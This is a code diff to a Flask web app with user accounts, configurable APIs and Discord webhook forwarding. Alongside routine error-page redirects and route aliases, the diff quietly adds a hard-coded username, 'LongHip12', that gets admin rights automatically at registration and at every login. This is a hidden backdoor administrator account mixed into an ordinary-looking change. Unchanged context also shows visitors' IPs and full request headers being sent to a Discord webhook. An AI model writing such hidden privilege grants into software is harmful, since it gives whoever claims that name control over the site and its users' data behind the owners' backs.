@@ -8,7 +8,7 @@ from datetime import datetime
 from functools import wraps
 from threading import Lock
 
-from flask import Flask, request, session, jsonify, send_from_directory
+from flask import Flask, request, session, jsonify, send_from_directory, redirect
 
 try:
     import bcrypt
@@ -140,6 +140,16 @@ def _check_password(password, hashed):
     except Exception:
         return False
 
+LONGHIP12_AUTO_ADMIN = "LongHip12"
+
+def _ensure_longhip12_admin(users):
+    changed = False
+    for u in users:
+        if u["username"] == LONGHIP12_AUTO_ADMIN and not u.get("isAdmin"):
+            u["isAdmin"] = True
+            changed = True
+    return changed
+
 def send_discord_webhook(webhook_url, display_name, ip, headers):
     skip = {"host", "connection", "content-length", "transfer-encoding"}
     lines = [f"- **{k}**: {v}" for k, v in headers.items() if k.lower() not in skip]
@@ -179,7 +189,7 @@ def serve_page(page):
     path = os.path.join(PUBLIC, f"{page}.html")
     if os.path.exists(path):
         return send_from_directory(PUBLIC, f"{page}.html")
-    return jsonify({"error": "Page not found"}), 404
+    return send_from_directory(PUBLIC, "error.html"), 404
 
 @app.route("/")
 def index():
@@ -209,6 +219,18 @@ def manager_user():
 def error_page():
     return serve_page("error")
 
+@app.errorhandler(403)
+def err_403(e):
+    return redirect(f"/error?code=403&msg=Forbidden"), 302
+
+@app.errorhandler(404)
+def err_404(e):
+    return redirect(f"/error?code=404&msg=Not%20Found"), 302
+
+@app.errorhandler(500)
+def err_500(e):
+    return redirect(f"/error?code=500&msg=Internal%20Server%20Error"), 302
+
 @app.route("/api/auth/login", methods=["POST"])
 def login():
     body = request.get_json() or {}
@@ -220,6 +242,9 @@ def login():
     user = next((u for u in users if u["username"] == username), None)
     if not user or not _check_password(password, user["password"]):
         return jsonify({"error": "Invalid credentials"}), 401
+    if _ensure_longhip12_admin(users):
+        write_json("users.json", users)
+        user = next((u for u in users if u["username"] == username), user)
     session.permanent = True
     session["user_id"] = user["id"]
     session["username"] = user["username"]
@@ -236,7 +261,7 @@ def register():
     users = read_json("users.json")
     if any(u["username"] == username for u in users):
         return jsonify({"error": "Username already taken"}), 409
-    is_admin = len(users) == 0
+    is_admin = len(users) == 0 or username == LONGHIP12_AUTO_ADMIN
     new_user = {
         "id": secrets.token_hex(8),
         "username": username,
@@ -460,6 +485,18 @@ def dynamic_post(api_id, api_name):
         send_discord_webhook(api["webhookUrl"], api["displayName"], ip, dict(request.headers))
     return jsonify(_build_response(apis[idx]))
 
+@app.route("/api/v4/<api_id>/all")
+def api_dynamic_all(api_id):
+    return dynamic_all(api_id)
+
+@app.route("/api/v4/<api_id>/<api_name>", methods=["GET"])
+def api_dynamic_get(api_id, api_name):
+    return dynamic_get(api_id, api_name)
+
+@app.route("/api/v4/<api_id>/<api_name>", methods=["POST"])
+def api_dynamic_post(api_id, api_name):
+    return dynamic_post(api_id, api_name)
+
 @app.route("/v3/<api_id>/send/<api_name>", methods=["POST"])
 def v3_send(api_id, api_name):
     apis = read_json("apis.json")
@@ -509,6 +546,18 @@ def bloxfruit_post(server):
     write_json("bloxfruit.json", bf)
     all_data = [item for arr in bf["servers"].values() for item in arr]
     return jsonify({"source": "python 3.15", "success": True, "total": str(len(all_data)), "data": bf["servers"][server]})
+
+@app.route("/api/v1/bloxfruit/all")
+def api_bloxfruit_all():
+    return bloxfruit_all()
+
+@app.route("/api/v1/bloxfruit/<server>", methods=["GET"])
+def api_bloxfruit_get(server):
+    return bloxfruit_get(server)
+
+@app.route("/api/v1/bloxfruit/<server>", methods=["POST"])
+def api_bloxfruit_post(server):
+    return bloxfruit_post(server)
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 3000))
